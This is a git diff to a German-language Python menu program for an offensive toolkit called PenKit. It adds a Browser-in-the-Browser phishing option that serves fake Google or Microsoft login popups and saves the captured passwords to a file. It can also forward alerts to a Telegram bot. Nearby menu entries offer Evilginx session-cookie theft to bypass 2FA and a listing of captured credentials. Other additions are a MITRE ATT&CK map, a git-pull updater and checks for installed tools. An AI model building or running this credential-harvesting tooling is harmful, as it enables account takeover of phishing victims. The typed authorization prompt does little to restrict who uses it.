@@ -44,7 +44,7 @@ def banner():
 {DG}  ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
 {DIM}  ┌────────────────────────────────────────────────────────┐{R}
 {DIM}  │  {R}{C}Authorized Pentesting Toolkit  v3.0{R}{DIM}                    │{R}
-{DIM}  │  {R}{DG}? = KI  |  H = Health  |  V = Recon  |  C = Cloud{R}{DIM}          │{R}
+{DIM}  │  {R}{DG}? = KI  |  H = Health  |  F = ATT&CK  |  U = Update{R}{DIM}         │{R}
 {DIM}  └────────────────────────────────────────────────────────┘{R}
 """
     print(art)
@@ -1495,6 +1495,7 @@ async def menu_phishing():
     menu_item(" 3", "🔗  GoPhish Integration",           "⛔", "Professionelle Kampagnen via GoPhish API")
     menu_item(" 4", "📄  Verfügbare Seiten anzeigen",    "🟡", "Google, Microsoft, Instagram, TikTok, Snapchat, Discord...")
     menu_item(" 5", "📋  Gespeicherte Credentials",      "🟡", "Zeigt alle gefangenen Passwörter aus letztem Run")
+    menu_item(" B", "🪟  Browser-in-the-Browser (BitB)", "⛔", "Fake Chrome-Popup mit echter URL in Adressleiste")
     print()
     menu_item(" E", "🪝  Evilginx 2FA-Bypass",          "⛔", "Reverse Proxy — klaut Session-Cookie, bypassed 2FA")
     print()
@@ -1732,6 +1733,66 @@ async def menu_phishing():
                     print(f"  {G}[{i}]{R}  {Y}{c['ip']:<16}{R}  {W}{c['username']:<30}{R}  {RD}{c['password']}{R}")
                     print(f"       {DIM}{c['timestamp']}  —  {c.get('page','?')}{R}")
                     print()
+        wait_key()
+
+    elif choice in ("b", "B"):
+        banner()
+        section("🪟  BROWSER-IN-THE-BROWSER (BitB)", "Fake Chrome-Popup — URL-Leiste zeigt echte Domain")
+        info_box([
+            "BitB = Browser-in-the-Browser — die überzeugendste Phishing-Technik.",
+            "",
+            "Wie es funktioniert:",
+            "  1. Opfer landet auf einer normalen Webseite (z.B. deinem Server)",
+            "  2. Klickt auf 'Mit Google anmelden' oder 'Mit Microsoft anmelden'",
+            "  3. Ein Popup erscheint — sieht 1:1 aus wie ein echtes Chrome-Fenster",
+            "  4. In der Adressleiste steht: accounts.google.com  (reines CSS-Trick!)",
+            "  5. Opfer gibt Passwort ein → landet sofort in /capture",
+            "",
+            "Warum so effektiv?",
+            "  → Kein echter Browser-Popup — reines HTML/CSS (nicht erkennbar für Nutzer)",
+            "  → URL-Leiste zeigt die echte Domain → klassischer Passwort-Check versagt",
+            "  → Kein Browser-Extension / Security-Tool prüft den inneren 'Rahmen'",
+            "",
+            "Gut kombinierbar mit: GoPhish, SMTP-Kampagne, Evil Twin Captive Portal",
+        ])
+        print()
+        print(f"  {Y}[1]{R}  BitB Google — accounts.google.com in Adressleiste")
+        print(f"  {Y}[2]{R}  BitB Microsoft — login.microsoftonline.com in Adressleiste")
+        print()
+        sub = prompt("bitb")
+
+        if sub in ("1", "2"):
+            page_name = "bitb-google" if sub == "1" else "bitb-microsoft"
+            try:
+                port = int(prompt("Port  (Enter = 8080)") or "8080")
+            except ValueError:
+                port = 8080
+            redirect = prompt("Redirect-URL nach Login  (Enter = echte Seite)") or (
+                "https://accounts.google.com" if sub == "1" else "https://login.microsoftonline.com"
+            )
+            tg_token   = prompt("Telegram Bot-Token  (Enter = kein Alert)") or ""
+            tg_chat_id = prompt("Telegram Chat-ID  (Enter = kein Alert)") or "" if tg_token else ""
+
+            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+                print(f"  {Y}[!] Abgebrochen.{R}")
+                wait_key()
+                return
+
+            from tools.phishing.server import PhishingServer
+            srv = PhishingServer(
+                page=page_name, port=port, redirect_url=redirect,
+                telegram_token=tg_token, telegram_chat_id=tg_chat_id,
+            )
+            try:
+                print(f"\n  {G}[+] BitB Server läuft auf Port {port}{R}")
+                print(f"  {C}    http://<deine-kali-ip>:{port}/{R}")
+                print(f"  {DIM}    Credentials → /tmp/penkit_phish_creds.json{R}")
+                print(f"\n  {Y}[!] Strg+C zum Stoppen{R}\n")
+                await run_tool_live(srv.run())
+            except KeyboardInterrupt:
+                print(f"\n  {Y}[*] Server gestoppt.{R}")
+
         wait_key()
 
     elif choice == "e":
@@ -3762,6 +3823,117 @@ async def menu_output():
     wait_key()
 
 
+async def menu_mitre():
+    """MITRE ATT&CK Mapping aller PenKit-Tools."""
+    from tools.mitre_attack import show_mitre_map
+
+    while True:
+        banner()
+        section("🗂️   MITRE ATT&CK MAP", "PenKit Tools nach Taktik / Technik geordnet")
+        info_box([
+            "Zeigt welche ATT&CK-Techniken jeder PenKit-Angriff verwendet.",
+            "Nützlich für Pentest-Reports, Lernzwecke und Red-Team-Planung.",
+        ])
+        print()
+        menu_item(" 1", "Nach Taktik sortieren",     "🟢", "Reconnaissance → Initial Access → Execution → ...")
+        menu_item(" 2", "Nach Kategorie sortieren",  "🟢", "WiFi / C2 / Web / MITM / Phishing / ...")
+        menu_item(" 3", "Tool suchen",               "🟢", "Zeigt alle Techniken für ein bestimmtes Tool")
+        menu_item(" 0", "← Zurück", "")
+        print()
+        choice = prompt("mitre")
+
+        if choice == "0":
+            return
+        elif choice == "1":
+            banner()
+            section("🗂️   MITRE ATT&CK — nach Taktik", "")
+            await run_tool_live(show_mitre_map(mode="tactic"))
+            wait_key()
+        elif choice == "2":
+            banner()
+            section("🗂️   MITRE ATT&CK — nach Kategorie", "")
+            await run_tool_live(show_mitre_map(mode="category"))
+            wait_key()
+        elif choice == "3":
+            query = ask("Tool-/Technik-Name suchen", required=True)
+            if not query:
+                continue
+            banner()
+            section(f"🔍  ATT&CK Suche: {query}", "")
+            await run_tool_live(show_mitre_map(mode="tactic", search=query))
+            wait_key()
+
+
+async def menu_update():
+    """PenKit aus GitHub aktualisieren."""
+    import subprocess as _sp
+    import shutil as _sh
+
+    banner()
+    section("🔄  PENKIT UPDATE", "git pull — neueste Version laden")
+
+    repo_path = os.path.expanduser("~/penkit-tui")
+    if not os.path.isdir(os.path.join(repo_path, ".git")):
+        # Fallback: Skript-Verzeichnis selbst
+        repo_path = os.path.dirname(os.path.abspath(__file__))
+        if not os.path.isdir(os.path.join(repo_path, ".git")):
+            print(f"  {RD}[!] Kein Git-Repository gefunden in:{R}")
+            print(f"      {DIM}{repo_path}{R}")
+            print(f"  {Y}[*] Manuell klonen:{R}")
+            print(f"  {C}    git clone https://github.com/elliot433/penkit-tui ~/penkit-tui{R}")
+            wait_key()
+            return
+
+    print(f"  {DIM}Repository: {repo_path}{R}\n")
+
+    # Current commit
+    try:
+        result = _sp.run(["git", "-C", repo_path, "log", "--oneline", "-1"],
+                         capture_output=True, text=True, timeout=10)
+        if result.stdout.strip():
+            print(f"  {DIM}Aktueller Commit: {result.stdout.strip()}{R}")
+    except Exception:
+        pass
+
+    print(f"  {G}[*] Lade Updates von GitHub...{R}\n")
+
+    try:
+        proc = _sp.run(
+            ["git", "-C", repo_path, "pull", "--rebase"],
+            capture_output=True, text=True, timeout=60,
+        )
+        output = (proc.stdout + proc.stderr).strip()
+        for line in output.split("\n"):
+            if not line.strip():
+                continue
+            if "Already up to date" in line or "up-to-date" in line.lower():
+                print(f"  {G}✓  {line}{R}")
+            elif "Fast-forward" in line or "file" in line:
+                print(f"  {C}→  {line}{R}")
+            elif "error" in line.lower() or "fatal" in line.lower():
+                print(f"  {RD}✗  {line}{R}")
+            else:
+                print(f"  {DIM}   {line}{R}")
+
+        if proc.returncode == 0:
+            print(f"\n  {G}[+] Update erfolgreich!{R}")
+            # New commit
+            result2 = _sp.run(["git", "-C", repo_path, "log", "--oneline", "-1"],
+                               capture_output=True, text=True, timeout=10)
+            if result2.stdout.strip():
+                print(f"  {DIM}Neuer Commit:    {result2.stdout.strip()}{R}")
+            print(f"  {Y}[!] Neustart empfohlen: python3 classic_menu.py{R}")
+        else:
+            print(f"\n  {RD}[!] Update fehlgeschlagen (Exit {proc.returncode}){R}")
+            print(f"  {DIM}Tipp: cd ~/penkit-tui && git status{R}")
+    except FileNotFoundError:
+        print(f"  {RD}[!] git nicht gefunden{R}")
+    except Exception as e:
+        print(f"  {RD}[!] {e}{R}")
+
+    wait_key()
+
+
 async def menu_anon():
     """Anonymitäts & OPSEC Manager."""
     while True:
@@ -4580,18 +4752,57 @@ async def menu_msf():
 
 
 def boot_sequence():
+    import shutil as _sh
     clr()
+
+    CRITICAL = [
+        ("nmap",       "Network Scanner"),
+        ("airmon-ng",  "WiFi Monitor-Mode"),
+        ("hashcat",    "GPU Cracker"),
+        ("bettercap",  "MITM Framework"),
+        ("sqlmap",     "SQL Injection"),
+    ]
+    OPTIONAL = [
+        ("msfconsole", "Metasploit"),
+        ("ollama",     "AI Terminal"),
+        ("dalfox",     "XSS Scanner"),
+        ("evilginx",   "2FA Bypass"),
+        ("bloodhound", "BloodHound AD"),
+    ]
+
     lines = [
         f"{DG}[{G}*{DG}]{R} Initializing PenKit TUI v3...",
         f"{DG}[{G}*{DG}]{R} Loading modules...",
-        f"{DG}[{G}*{DG}]{R} Checking privileges...",
-        f"{DG}[{G}+{DG}]{G} Root access confirmed{R}",
-        f"{DG}[{G}*{DG}]{R} All systems operational",
     ]
     for line in lines:
         slow(f"  {line}", delay=0.012)
-        time.sleep(0.08)
-    time.sleep(0.3)
+        time.sleep(0.06)
+
+    # Quick privilege check
+    try:
+        is_root = os.geteuid() == 0
+    except AttributeError:
+        is_root = False
+    if is_root:
+        slow(f"  {DG}[{G}+{DG}]{G} Root access confirmed{R}", delay=0.012)
+    else:
+        slow(f"  {DG}[{Y}!{DG}]{Y} Not root — WiFi/MITM need: sudo -E python3 classic_menu.py{R}", delay=0.012)
+
+    # Silent quick-check of critical tools
+    missing_crit = [name for name, _ in CRITICAL if not _sh.which(name)]
+    missing_opt  = [name for name, _ in OPTIONAL if not _sh.which(name)]
+
+    if missing_crit:
+        slow(f"  {DG}[{RD}!{DG}]{RD} Missing critical tools: {', '.join(missing_crit)}{R}", delay=0.008)
+        slow(f"  {DG}[{Y}*{DG}]{DIM} Run H → Health Check for install commands{R}", delay=0.008)
+    else:
+        slow(f"  {DG}[{G}+{DG}]{G} Core tools: OK{R}", delay=0.012)
+
+    if missing_opt:
+        slow(f"  {DG}[{Y}~{DG}]{Y} Optional not installed: {', '.join(missing_opt[:3])}{'...' if len(missing_opt)>3 else ''}{R}", delay=0.008)
+
+    slow(f"  {DG}[{G}*{DG}]{R} All systems operational", delay=0.012)
+    time.sleep(0.25)
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -4634,9 +4845,11 @@ async def main_menu():
         menu_item(" N", "🧅  Anonymität / Tor",      "🟢", "Tor starten, IP-Leak-Check, proxychains")
         menu_item(" T", "📚  Tutorials",              "🟢", "Schritt-für-Schritt Anleitungen für alle Module")
         menu_item(" H", "🏥  Health Check",           "🟢", "Prüft welche Tools installiert sind")
+        menu_item(" F", "🗂️   MITRE ATT&CK Map",      "🟢", "Zeigt ATT&CK Taktiken/Techniken für alle PenKit-Tools")
         menu_item(" M", "🗺️   Target Map",             "🟡", "Interaktive Karte mit allen bekannten Ziel-Infos")
         menu_item(" R", "📊  HTML Report",            "🟢", "Alle Scan-Ergebnisse → professioneller HTML-Report")
         menu_item(" O", "📁  Output-Verzeichnis",     "🟢", "Zeigt ~/penkit-output/ — alle gespeicherten Dateien")
+        menu_item(" U", "🔄  Update PenKit",          "🟢", "git pull — neueste Version aus GitHub laden")
         print(f"  {DIM}└{'─'*66}┘{R}")
         print()
         menu_item(" 0", "❌  Exit", "")
@@ -4669,6 +4882,8 @@ async def main_menu():
             "o": menu_output,"O": menu_output,
             "a": menu_ai_terminal, "A": menu_ai_terminal,
             "n": menu_anon,  "N": menu_anon,
+            "f": menu_mitre, "F": menu_mitre,
+            "u": menu_update,"U": menu_update,
         }
 
         if choice == "0":
